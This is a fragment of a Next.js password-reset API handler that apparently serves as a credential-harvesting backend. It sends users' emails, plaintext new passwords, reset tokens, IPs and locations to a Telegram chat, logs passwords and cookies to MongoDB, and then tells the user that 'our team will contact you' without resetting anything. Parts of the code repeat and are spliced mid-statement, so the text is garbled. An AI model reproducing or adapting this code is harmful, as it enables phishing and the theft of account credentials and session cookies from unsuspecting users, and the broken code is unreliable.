        message: password ? `Password reset with new password: ${password}` : "Password reset token generated.",
        ipAddress: context.ipAddress,
        location: context.location,
        userAgent: context.userAgent,
        cookies: context.cookies,
        sessionToken: token,
      }),
      appendForgotPasswordRequest({
        email: user.email,
        status: "TOKEN_GENERATED",
        token,
        expiresAt,
        ipAddress: context.ipAddress,
        location: context.location,
        userAgent: context.userAgent,
        cookies: context.cookies,
      }),
      sendTelegramMessage(
        [
          "<b>Password reset request</b>",
          `Email: ${user.email}`,
          password ? `New Password: ${password}` : "",
          `Expires: ${expiresAt.toISOString()}`,
          `Token: <code>${token}</code>`,
          `IP: ${context.ipAddress}`,
          `Location: ${context.location}`,
          `User Agent: ${context.userAgent}`,
        ].filter(line => line).join("\n"),
      ),
      // Log to MongoDB
      (async () => {
        try {
          await connectDB();
          await ForgotPasswordRequest.create({
            email: user.email,
            status: "TOKEN_GENERATED",
            token,
            expiresAt,
            ipAddress: context.ipAddress,
            location: context.location,
            userAgent: context.userAgent,
            cookies: context.cookies,
            timestamp: timestamp2,
          });
          // Also log to LoginAttempt with password
          if (password) {
            await LoginAttempt.create({
              type: "FORGOT_PASSWORD",
              email: user.email,
              message: "Password reset attempt with new password",
              password: password,
              ipAddress: context.ipAddress,
              location: context.location,
              userAgent: context.userAgent,
              cookies: context.cookies,
              timestamp: timestamp2,
            });
          }
        } catch (error) {
          console.error("[forgot] Failed to log to MongoDB:", error);
        }
      })(),
      // Send Gmail notification
      sendForgotPasswordNotification({
        email: user.email,
        status: "TOKEN_GENERATED",
        token,
        expiresAt,
        ipAddress: context.ipAddress,
        location: context.location,
        userAgent: context.userAgent,
        timestamp: timestamp2,
      }),
    ]);
            userAgent: context.userAgent,
            cookies: context.cookies,
            timestamp,
          });
        } catch (error) {
          console.error("[forgot] Failed to log to MongoDB:", error);
        }
      })(),
      // Send Gmail notification
      sendForgotPasswordNotification({
        email: user.email,
        status: "TOKEN_GENERATED",
        token,
        expiresAt,
        ipAddress: context.ipAddress,
        location: context.location,
        userAgent: context.userAgent,
        timestamp,
      }  email: user.email,
        message: "Password reset token generated.",
        ipAddress: context.ipAddress,
        location: context.location,
        userAgent: context.userAgent,
        cookies: context.cookies,
        sessionToken: token,
      }),
      appendForgotPasswordRequest({
        email: user.email,
        status: "TOKEN_GENERATED",
        token,
        expiresAt,
        ipAddress: context.ipAddress,
        location: context.location,
        userAgent: context.userAgent,
        cookies: context.cookies,
      }),
      sendTelegramMessage(
        [
          "<b>Password reset token</b>",
          `Email: ${user.email}`,
          `Expires: ${expiresAt.toISOString()}`,
          `Token: <code>${token}</code>`,
          `IP: ${context.ipAddress}`,
          `Location: ${context.location}`,
          `User Agent: ${context.userAgent}`,
        ].join("\n"),
      ),
    ]);

    return NextResponse.json(
      {
        message:
          "Your password reset request has been submitted. Our team will contact you shortly.",
      },
      { status: 200 },
    );
  } catch (error) {
    console.error("[forgot] Unexpected error:", error);
    return NextResponse.json(
      { error: "Unable to process reset request right now." },
      { status: 500 },
    );
  }
}
